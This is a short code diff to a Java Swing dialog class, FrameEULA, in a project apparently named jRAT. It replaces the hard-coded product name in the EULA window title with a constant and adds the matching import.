@@ -18,6 +18,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
+import pro.jrat.Constants;
 import pro.jrat.Main;
 import pro.jrat.common.Version;
 import pro.jrat.settings.Settings;
@@ -47,7 +48,7 @@ public class FrameEULA extends BaseDialog {
 			}
 		});
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameEULA.class.getResource("/icons/gavel.png")));
-		setTitle("jRAT " + Version.getVersion() + " EULA");
+		setTitle(Constants.NAME + " " + Version.getVersion() + " EULA");
 		setResizable(false);
 		setBounds(100, 100, 468, 348);
 		contentPane = new JPanel();
